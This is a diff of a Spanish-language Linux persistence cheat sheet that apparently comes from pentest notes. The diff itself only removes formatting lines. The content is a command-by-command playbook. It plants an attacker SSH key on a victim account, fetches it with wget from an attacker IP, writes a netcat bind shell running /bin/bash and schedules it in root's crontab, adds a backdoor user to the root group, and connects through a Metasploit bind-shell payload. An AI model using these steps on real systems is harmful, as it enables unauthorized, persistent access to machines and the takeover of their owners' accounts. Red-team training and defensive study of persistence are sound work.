@@ -1,15 +1,6 @@
 # Linux
-
-# Tabla de Contenido
-
----
-
 # Malicious SSH Key [ *con credenciales* ]
-
----
-
 ## Generación de par de claves
-
 ```bash
 **ssh-keygen** -t rsa -b 4096
 
@@ -17,7 +8,6 @@
 ```
 
 ## Tranferencia de la clave pública al usuario comprometido
-
 ```bash
 **ssh-copy-id** *<victim-user>***@***<target-ip-or-hostname>
 
@@ -25,17 +15,12 @@
 ```
 
 ## Conexión con SSH
-
 ```bash
 **ssh** *<victim-user>***@***<target-ip-or-hostname>*
 ```
 
 # Malicious SSH Key [ *sin credenciales* ]
-
----
-
 ## Generación de par de claves
-
 ```bash
 **ssh-keygen** -t rsa -b 4096
 
@@ -43,7 +28,6 @@
 ```
 
 ## Inicialización de servidor Python
-
 ```bash
 **cd** ~/.ssh/
 **
@@ -54,7 +38,6 @@
 ```
 
 ## Descargar archivo [ *máquina atacante* ]
-
 ```bash
 **wget** http://*<attacker-ip>/id_rsa.pub*
 
@@ -62,49 +45,34 @@
 ```
 
 # Malicious Crontab
-
----
-
 ## Creación de bindshell
-
 ```bash
 **echo** 'nc -lkvnp 4443 -e /bin/bash >/dev/null &' > /tmp/bindshell
 ```
 
 ## Creación de crontab maliciosa
-
 ```bash
 **echo '*** * * * * /tmp/bindshell' | sudo tee -a /var/spool/cron/crontabs/root
 ```
 
 # New User
-
----
-
 ## Creación de nuevo usuario
-
 ```bash
 **adduser** -m ****user -s /bin/bash **ftp**
 ```
 
 ## Cambio de contraseña
-
 ```bash
 **passwd** ftp
 ```
 
 ## Agregar el usuario a grupo root
-
 ```bash
 **usermod** -aG root **ftp**
 ```
 
 # Extra
-
----
-
 ## Obteniendo conexión con Bindshell
-
 ```bash
 **use** payload/generic/shell_bind_tcp
 
@@ -116,7 +84,6 @@
 ```
 
 ## Obteniendo conexión con Bindshell
-
 ```bash
 *# CTRL + Z o escribe 'background' para poner la sesión previamente obtenida en segundo plano*
 
